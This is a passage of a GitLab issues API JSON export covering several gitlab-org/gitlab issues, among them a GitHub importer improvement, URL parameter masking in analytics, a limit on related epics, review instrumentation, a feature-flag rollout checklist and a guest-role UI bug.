`https://gitlab.com/import/github/status`.\n\n## Further iterations\n\nThis issue may also need to be solved for other importers. \n\nAdditionally, we should consider defaulting to the currently selected group when creating projects from the ` + ` navigation menu selection.","state":"closed","created_at":"2022-02-28T20:27:28.708Z","updated_at":"2022-06-08T06:43:21.971Z","closed_at":"2022-04-18T20:20:08.806Z","closed_by":{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"},"labels":["Category:Importers","Importer:GitHub","Next Up","PM Ready","UX","devops::manage","estimation::completed","frontend","group::import","release post item::in review","section::dev","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"}],"author":{"id":5247073,"username":"hdelalic","name":"Haris Delalić","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5247073/avatar.png","web_url":"https://gitlab.com/hdelalic"},"type":"ISSUE","assignee":{"id":1230286,"username":"xanf","name":"Illya Klymov","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ce4d16557b46210fa57641531b570dd4?s=80\u0026d=identicon","web_url":"https://gitlab.com/xanf"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353936","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353936","notes":"https://gitlab.com/api/v4/projects/278964/issues/353936/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353936/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353936","relative":"#353936","full":"gitlab-org/gitlab#353936"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3051,"epic":{"id":39431,"iid":3051,"title":"💡 GitHub Importer improvements","url":"/groups/gitlab-org/-/epics/3051","group_id":9970},"iteration":null,"health_status":null},{"id":103851977,"iid":353930,"project_id":278964,"title":"Do not mask GLM URL parameters","description":"# Problem\nWe currently mask the URL path from data in Sisense due to the fact that it could contain PII data. However, when masking the URL path we're also masking the URL query parameters which contains useful business data that is not considered PII.\n \n## Example:\n* This issue is discussed in length here https://gitlab.com/gitlab-data/analytics/-/issues/9496#note_854046650 when attempting to add this data to Sisense.\n* To experience this in production, open any free SaaS account navigate to the group billing page and select \"start trial\" you will then see the GLM values appended to the trial URL. However, this data will be masked in our page view data collected via snowplow.\n\n# Solution\nWe look into either specifically not passing query parameters that contain `GLM` or we look into potentially not masking any query parameters if feel comfortable that all query parameters do not contain PII.","state":"closed","created_at":"2022-02-28T19:28:44.388Z","updated_at":"2022-04-22T14:39:04.796Z","closed_at":"2022-04-22T14:39:04.782Z","closed_by":{"id":1863977,"username":"michold","name":"Michał Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"labels":["Category:Service Ping","auto updated","backend","devops::growth","group::product intelligence","missed:14.10","product intelligence::onboarding issue","section::growth","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1863977,"username":"michold","name":"Michał Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"}],"author":{"id":4413992,"username":"s_awezec","name":"Sam Awezec","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4413992/avatar.png","web_url":"https://gitlab.com/s_awezec"},"type":"ISSUE","assignee":{"id":1863977,"username":"michold","name":"Michał Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353930","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353930","notes":"https://gitlab.com/api/v4/projects/278964/issues/353930/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353930/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353930","relative":"#353930","full":"gitlab-org/gitlab#353930"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103845589,"iid":353915,"project_id":278964,"title":"Limit maximum number on related epics","description":"In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81422 we introduced support for querying related epics of an epic. This results in N+1 queries when performing authorisation to read these epics. To mitigate this performance issue we should consider introducing a limit on the number of epics that can be related to a single epic.\n\nThe following discussion from !81422 should be addressed:\n\n- [ ] @egrieff started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81422#note_854282137):  (+5 comments)\n\n    \u003e This method `#epics_readable_by_user` calls `epic.readable_by?` that is defined in [`ApplicationRecord`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/application_record.rb#L120) and checks for permissions directly:\n    \u003e \n    \u003e ```ruby\n    \u003e Ability.allowed?(user, \"read_#{to_ability_name}\".to_sym, self)\n    \u003e ```\n    \u003e This results in N+1 queries so I tried redefining `#readable_by?` in the epic model to match the policies and improve performance (as being done for [issues](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/issue.rb#L596)), but could only save extra `saml_providers`, no group hierarchy queries.\n    \u003e \n    \u003e \u003cdetails\u003e\u003csummary\u003ehere's the deifnition I tested it with\u003c/summary\u003e\n    \u003e \n    \u003e ```ruby\n    \u003e     def readable_by?(user)\n    \u003e       return false unless group.licensed_feature_available?(:epics)\n    \u003e       return publicly_visible? unless user\n    \u003e \n    \u003e       if user.can_read_all_resources?\n    \u003e         true\n    \u003e       elsif confidential?\n    \u003e         ::Group.groups_user_can(group.self_and_ancestors, user, :read_confidential_epic, same_root: true).any?\n    \u003e       elsif group.public? || (group.internal? \u0026\u0026 !user.external?)\n    \u003e         true\n    \u003e       else\n    \u003e         ::Group.groups_user_can_read_epics(group.self_and_ancestors, user, same_root: true).any?\n    \u003e       end\n    \u003e     end\n    \u003e \n    \u003e     # Returns `true` if this Epic is publicly visible.\n    \u003e     def publicly_visible?\n    \u003e       group.public? \u0026\u0026 !confidential?\n    \u003e     end\n    \u003e ```\n    \u003e \n    \u003e \u003c/details\u003e\n    \u003e \n    \u003e I commented in the [specs](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81422/diffs#e02f3956a5d29f774f72ae293a8c3b4f63f8912b_0_18) \n    \u003e  (also [here](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81422/diffs#b220f7e526d98227cda9ca8ac9e123340001552e_845_879)) what the extra queries were, but they will vary depending on the epics group hierarchy.\n\n- [ ] Jan Provaznik `@jprovaznik` [commented](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81422#note_855592104):\n\n    \u003e\u003e you also can reference unliminted number of epics in comments and reference redactor verifies these too - I assume the same N+1 issue is there too?\n\n    \u003e Yep, there is N+1 issue too (as expected) - similar check is done in https://gitlab.com/gitlab-org/gitlab/blob/master/lib/banzai/reference_parser/issuable_parser.rb#L12.\n    \u003e I think the best we can do at this point is make sure we preload relevant associations (to minimize number of extra queries) and add a limit on maximimum number on related epics (out of scope of this MR).","state":"closed","created_at":"2022-02-28T16:35:22.396Z","updated_at":"2022-05-24T11:59:55.798Z","closed_at":"2022-04-27T10:05:17.860Z","closed_by":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"labels":["Application Limits","Deliverable","Next Up","backend","devops::plan","documentation","group::product planning","missed-deliverable","missed:14.10","missed:14.9","section::dev","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"}],"author":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"type":"ISSUE","assignee":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353915","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353915","notes":"https://gitlab.com/api/v4/projects/278964/issues/353915/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353915/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353915","relative":"#353915","full":"gitlab-org/gitlab#353915"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7736,"epic":{"id":470053,"iid":7736,"title":"Epic to epic linking - Enhancements","url":"/groups/gitlab-org/-/epics/7736","group_id":9970,"human_readable_end_date":"Mar 31, 2023","human_readable_timestamp":"\u003cstrong\u003e3\u003c/strong\u003e months remaining"},"iteration":null,"health_status":null},{"id":103841882,"iid":353912,"project_id":278964,"title":"Instrumentation: Add comment and approval as part of review","description":"## Background\n\nAs part of https://gitlab.com/groups/gitlab-org/-/epics/7362 we need to instrument the new behavior so we can understand it's usage and value.\n\n## Proposal\n\nWe should implement the following with `redis_hll`:\n\n1. Count of unique users per period who fill in comment\n1. Count of comments filled per period\n1. Count of unique users period who approve in that action\n1. Count of approvals with action in that period\n\n![Screenshot_2022-03-09_at_12.37.42](/uploads/b0c007b5b1ba9d1f419c650f9d2dd54a/Screenshot_2022-03-09_at_12.37.42.png)","state":"closed","created_at":"2022-02-28T15:28:36.572Z","updated_at":"2022-09-21T12:01:42.736Z","closed_at":"2022-09-14T14:29:01.209Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Category:Code Review Workflow","Deliverable","auto updated","customer","devops::create","frontend","group::code review","instrumentation","merge requests","missed-deliverable","missed:15.2","missed:15.3","section::dev","type::feature","workflow::in review"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":25,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353912","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353912","notes":"https://gitlab.com/api/v4/projects/278964/issues/353912/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353912/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353912","relative":"#353912","full":"gitlab-org/gitlab#353912"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7362,"epic":{"id":418663,"iid":7362,"title":"Improve code review (batch comments) experience","url":"/groups/gitlab-org/-/epics/7362","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":103832864,"iid":353896,"project_id":278964,"title":"[Feature flag] Enable related epics","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [related epics](https://gitlab.com/groups/gitlab-org/-/epics/7546) on production,\nthat is currently behind the `related_epics_widget` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: Plan, Product planning\n- Most appropriate slack channel to reach out to: `#s_plan`\n- Best individual to reach out to: egrieff, felipe_artur, jprovaznik, kushalpandya\n- PM: mushakov\n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set related_epics_widget true --dev`\n    - [x] `/chatops run feature set related_epics_widget true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab related_epics_widget true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss related_epics_widget true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com related_epics_widget true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --group=gitlab-org related_epics_widget true`\n    - [x] `/chatops run feature set --group=gitlab-com related_epics_widget true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e related_epics_widget true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set related_epics_widget \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set related_epics_widget \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set related_epics_widget true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `related_epics_widget`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete related_epics_widget --dev`\n    - [ ] `/chatops run feature delete related_epics_widget --staging`\n    - [ ] `/chatops run feature delete related_epics_widget`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set related_epics_widget false\n```","state":"closed","created_at":"2022-02-28T12:57:53.189Z","updated_at":"2022-03-29T11:48:18.110Z","closed_at":"2022-03-29T11:46:46.315Z","closed_by":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"labels":["Stretch","backend","devops::plan","feature flag","feature::addition","group::product planning","section::dev","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"}],"author":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"type":"ISSUE","assignee":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353896","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":14},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"14 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353896","notes":"https://gitlab.com/api/v4/projects/278964/issues/353896/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353896/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353896","relative":"#353896","full":"gitlab-org/gitlab#353896"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7546,"epic":{"id":439603,"iid":7546,"title":"Add support for epic to epic linking - MVC 1","url":"/groups/gitlab-org/-/epics/7546","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103073848,"iid":353853,"project_id":278964,"title":"'New Epic' button is visible from Board list for users with Guest role","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\nA user with guest permissions can see the \"New Epic\" button on lists of a board even though they do not have access to create epics.\n\n### Steps to reproduce\n1. Login as a user with guest max permissions on a group.\n1. Visit and epic board that has some lists\n1. Click the \"New Epic\" button\n1. Fill out a title\n1. Click \"New Epic\" button\n1. see the error message\n\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\nCurrently, a user with the \"guest\" max role can create an epic from a board list. The add will fail because they do not have permission.\n\n### What is the expected *correct* behavior?\n\nIt would be expected that the button does not exist for a user that does not have permission to create epics.\n\n### Relevant logs and/or screenshots\n\nHere is what a user sees while trying to create an epic from a board as a guest user.\n\n![image](/uploads/e96760bb48316b1114d7ae7a8f907310/image.png)\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2022-02-25T22:03:55.537Z","updated_at":"2022-04-26T18:49:23.613Z","closed_at":"2022-04-14T10:36:29.940Z","closed_by":{"id":411701,"username":"kushalpandya","name":"Kushal Pandya","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/411701/avatar.png","web_url":"https://gitlab.com/kushalpandya"},"labels":["devops::plan","frontend","group::product planning","priority::4","section::dev","severity::4","type::bug","workflow::in review"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":411701,"username":"kushalpandya","name":"Kushal Pandya","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/411701/avatar.png","web_url":"https://gitlab.com/kushalpandya"}],"author":{"id":120082,"username":"mryanb","name":"Ryan Bantz","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c90e7d5459fc2519dfeae63daec7d40?s=80\u0026d=identicon","web_url":"https://gitlab.com/mryanb"},"type":"ISSUE","assignee":{"id":411701,"username":"kushalpandya","name":"Kushal 